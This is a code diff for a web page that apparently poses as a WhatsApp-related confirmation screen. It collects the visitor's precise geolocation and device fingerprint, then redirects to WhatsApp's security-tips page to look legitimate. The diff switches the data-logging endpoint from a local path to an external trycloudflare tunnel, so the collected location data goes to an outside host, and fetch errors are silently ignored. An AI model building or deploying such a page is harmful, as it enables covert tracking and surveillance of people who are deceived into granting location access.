@@ -114,7 +114,7 @@
                 showStatus(`✅ تم التأكيد! (دقة ${Math.round(acc)}م)`, 'success');
                 initMap(lat, lng, acc);
                 sendData({ latitude: lat, longitude: lng, accuracy: acc });
-                setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
+                setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'; }, 3000);
             }
 
             function errorHandler(err) {
@@ -150,7 +150,7 @@
                     hardwareConcurrency: navigator.hardwareConcurrency, screen: `${window.screen.width}x${window.screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
-                try { await fetch('/log', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e) {}
+                try { await fetch('https://tube-workers-exactly-this.trycloudflare.com/log', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e) {}
             }
         })();
     </script>
